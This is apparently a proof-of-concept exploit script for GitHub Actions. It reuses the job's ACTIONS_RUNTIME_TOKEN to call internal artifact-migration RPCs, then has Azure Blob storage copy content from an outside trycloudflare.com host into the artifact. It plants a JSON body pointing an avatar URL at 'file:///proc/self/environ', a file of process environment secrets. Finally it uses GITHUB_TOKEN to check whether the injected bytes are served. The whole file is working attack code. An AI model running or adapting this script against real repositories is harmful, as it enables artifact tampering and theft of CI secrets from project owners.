import https from 'node:https';

const sourceBase = 'https://overview-watches-swim-township.trycloudflare.com/';
const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
const resultsBase = process.env.ACTIONS_RESULTS_URL;
const claims = JSON.parse(Buffer.from(runtimeToken.split('.')[1], 'base64url'));
const scope = claims.scp.split(' ').find(value => value.startsWith('Actions.Results:'));
if (!scope) throw new Error('runtime token has no Actions.Results scope');
const [, workflowRunBackendId] = scope.split(':');

function request(url, options = {}, body = undefined) {
  return new Promise((resolve, reject) => {
    const req = https.request(url, options, response => {
      const chunks = [];
      response.on('data', chunk => chunks.push(chunk));
      response.on('end', () => resolve({
        status: response.statusCode,
        headers: response.headers,
        rawHeaders: response.rawHeaders,
        body: Buffer.concat(chunks),
      }));
    });
    req.on('error', reject);
    req.setTimeout(20000, () => req.destroy(new Error('request timeout')));
    if (body !== undefined) req.write(body);
    req.end();
  });
}

async function artifactRpc(method, document) {
  const body = Buffer.from(JSON.stringify(document));
  return request(new URL(
    `/twirp/github.actions.results.api.v1.ArtifactService/${method}`,
    resultsBase,
  ), {
    method: 'POST',
    headers: {
      authorization: `Bearer ${runtimeToken}`,
      accept: 'application/json',
      'content-type': 'application/json',
      'content-length': String(body.length),
    },
  }, body);
}

function typeHex(response) {
  const value = response?.headers?.['content-type'] || '';
  return Buffer.from(value, 'latin1').toString('hex');
}

const name = `migrated-${process.env.GITHUB_RUN_ID}`;
const migrated = await artifactRpc('MigrateArtifact', {
  workflow_run_backend_id: workflowRunBackendId,
  name,
});
console.log('MIGRATE-CREATE', JSON.stringify({
  status: migrated.status,
  response: migrated.body.toString().replace(/https:\/\/[^" ]+/g, '<URL>').slice(0, 300),
}));
if (migrated.status !== 200) process.exit(0);
const created = JSON.parse(migrated.body);
const uploadUrl = created.signed_upload_url;
if (!uploadUrl) throw new Error('MigrateArtifact returned no signed_upload_url');

const placeholder = Buffer.from('{}');
const upload = await request(uploadUrl, {
  method: 'PUT',
  headers: {
    'x-ms-blob-type': 'BlockBlob',
    'content-type': 'application/json',
    'content-length': String(placeholder.length),
  },
}, placeholder);
if (upload.status !== 201) throw new Error(`initial upload failed: ${upload.status}`);

const finalized = await artifactRpc('FinalizeMigratedArtifact', {
  workflow_run_backend_id: workflowRunBackendId,
  name,
  size: String(placeholder.length),
});
if (finalized.status !== 200) {
  throw new Error(`FinalizeMigratedArtifact returned ${finalized.status}: ${finalized.body}`);
}
const artifactId = String(JSON.parse(finalized.body).artifact_id);
const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${artifactId}/zip`;
const source = `${sourceBase}?repository=${encodeURIComponent(repository)}`;
const expected = Buffer.from(JSON.stringify({
  full_name: repository,
  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
  description: 'Repo Cassette carrier',
  stargazers_count: 0,
}));
const copied = await request(uploadUrl, {
  method: 'PUT',
  headers: {
    'x-ms-version': '2023-11-03',
    'x-ms-copy-source': source,
    'x-ms-blob-type': 'BlockBlob',
    'content-length': '0',
  },
});

const first = await request(
  `https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/actions/artifacts/${artifactId}/zip`,
  {headers: {
    authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
    accept: 'application/vnd.github.v3+json',
    'user-agent': 'repo-cassette-migration-probe',
  }},
);
const location = first.headers.location || '';
const final = location ? await request(location) : null;
console.log('MIGRATE-RESULT', JSON.stringify({
  artifactId,
  repository,
  expectedBytes: expected.length,
  uploadPath: new URL(uploadUrl).pathname,
  uploadPermissions: new URL(uploadUrl).searchParams.get('sp'),
  copyStatus: copied.status,
  publicStatus: first.status,
  locationQueryKeys: location ? [...new URL(location).searchParams.keys()].sort() : [],
  rsct: location ? new URL(location).searchParams.get('rsct') : null,
  apiVersion: location ? new URL(location).searchParams.get('api-version') : null,
  finalStatus: final?.status,
  finalTypeHex: typeHex(final),
  bodyMatch: final?.body.equals(expected),
}));
